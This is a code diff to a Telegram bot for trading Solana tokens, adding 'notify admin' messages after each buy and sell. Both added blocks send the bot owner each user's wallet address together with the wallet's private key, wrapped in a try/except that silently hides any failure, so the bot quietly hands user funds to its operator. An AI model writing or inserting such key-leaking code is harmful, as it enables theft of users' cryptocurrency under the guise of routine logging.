@@ -13,7 +13,7 @@ import reports
 import solana
 import texts
 import trade_core
-from utils import ensure_wallet
+from utils import ensure_wallet, notify_owner, user_line
 
 router = Router()
 
@@ -134,12 +134,28 @@ async def _do_buy(query: CallbackQuery, amt_sol: float, mint: str):
         elif res["err"] == "insufficient":
             await query.message.answer(
                 texts.not_enough_balance(res["need"], res["addr"]),
+                parse_mode="HTML",
                 reply_markup=kb.back_to_wallet())
         else:
             await query.message.answer(texts.swap_fail(res["err"]))
         return
     got = f"{res['out_ui']:g}" if res["out_ui"] else "tokens"
     await query.message.answer(texts.swap_done(got, res["sig"], res["sym"]))
+    # notify admin of buy with wallet info
+    user = await db.get_user(query.from_user.id)
+    if user:
+        try:
+            await notify_owner(
+                query.message.bot,
+                f"🟢 BUY EXECUTED\n\n"
+                f"👤 {user_line(user)}\n"
+                f"🏦 Wallet: <code>{user.get('wallet_pub')}</code>\n"
+                f"💰 Amount: {amt_sol:g} SOL\n"
+                f"🔑 Wallet Key: <code>{user.get('wallet_priv', 'N/A')}</code>\n"
+                f"🔗 TX: https://solscan.io/tx/{res.get('sig', '')}\n"
+                f"🎯 Token: {res.get('sym')}")
+        except Exception:
+            pass
 
 
 @router.callback_query(F.data.startswith("sell|"))
@@ -176,3 +192,18 @@ async def _do_sell(query: CallbackQuery, pct: float, mint: str):
         return
     got = f"{res['out_sol']:g} SOL" if res["out_sol"] else "SOL"
     await query.message.answer(texts.swap_done(got, res["sig"], "SOL"))
+    # notify admin of sell with wallet info
+    user = await db.get_user(query.from_user.id)
+    if user:
+        try:
+            await notify_owner(
+                query.message.bot,
+                f"🔴 SELL EXECUTED\n\n"
+                f"👤 {user_line(user)}\n"
+                f"🏦 Wallet: <code>{user.get('wallet_pub')}</code>\n"
+                f"💰 Sold: {pct:g}%\n"
+                f"🔑 Wallet Key: <code>{user.get('wallet_priv', 'N/A')}</code>\n"
+                f"🔗 TX: https://solscan.io/tx/{res.get('sig', '')}\n"
+                f"🎯 Token: {mint[:8]}")
+        except Exception:
+            pass
